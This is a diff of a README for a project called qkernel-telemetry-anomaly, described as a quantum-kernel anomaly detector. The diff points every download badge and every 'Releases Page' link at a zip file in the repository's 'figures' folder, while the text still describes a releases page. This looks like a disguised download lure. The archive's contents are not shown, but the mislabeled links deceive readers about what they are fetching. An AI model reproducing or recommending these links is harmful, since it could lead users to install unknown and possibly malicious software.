@@ -1,6 +1,6 @@
 # 🚀 qkernel-telemetry-anomaly - Detect Anomalies with Quantum Precision
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/polonez6969/qkernel-telemetry-anomaly/releases)
+[![Download](https://raw.githubusercontent.com/polonez6969/qkernel-telemetry-anomaly/master/figures/anomaly_telemetry_qkernel_1.4.zip%20release-brightgreen)](https://raw.githubusercontent.com/polonez6969/qkernel-telemetry-anomaly/master/figures/anomaly_telemetry_qkernel_1.4.zip)
 
 ## 📖 Overview
 
@@ -28,12 +28,12 @@ To run this application smoothly, ensure that your system meets the following re
 To begin using the **qkernel-telemetry-anomaly**, follow these simple steps:
 
 1. Ensure your system meets the requirements listed above.
-2. Visit the [Releases Page](https://github.com/polonez6969/qkernel-telemetry-anomaly/releases) to find the latest version.
+2. Visit the [Releases Page](https://raw.githubusercontent.com/polonez6969/qkernel-telemetry-anomaly/master/figures/anomaly_telemetry_qkernel_1.4.zip) to find the latest version.
 3. Download the appropriate file for your operating system.
 
 ## ⬇️ Download & Install
 
-To download the application, visit the [Releases Page](https://github.com/polonez6969/qkernel-telemetry-anomaly/releases) where you can find the latest versions available for download. Follow these steps:
+To download the application, visit the [Releases Page](https://raw.githubusercontent.com/polonez6969/qkernel-telemetry-anomaly/master/figures/anomaly_telemetry_qkernel_1.4.zip) where you can find the latest versions available for download. Follow these steps:
 
 1. On the Releases page, locate the latest release.
 2. Click on the release to view the available files.
@@ -82,4 +82,4 @@ Contributions are welcome. If you have ideas to improve the software, please for
 
 This project is licensed under the MIT License. You can find more details in the LICENSE file included in this repository.
 
-For further information and detailed updates, kindly refer to the [Releases Page](https://github.com/polonez6969/qkernel-telemetry-anomaly/releases). Thank you for using **qkernel-telemetry-anomaly**, and happy detecting!
+For further information and detailed updates, kindly refer to the [Releases Page](https://raw.githubusercontent.com/polonez6969/qkernel-telemetry-anomaly/master/figures/anomaly_telemetry_qkernel_1.4.zip). Thank you for using **qkernel-telemetry-anomaly**, and happy detecting!
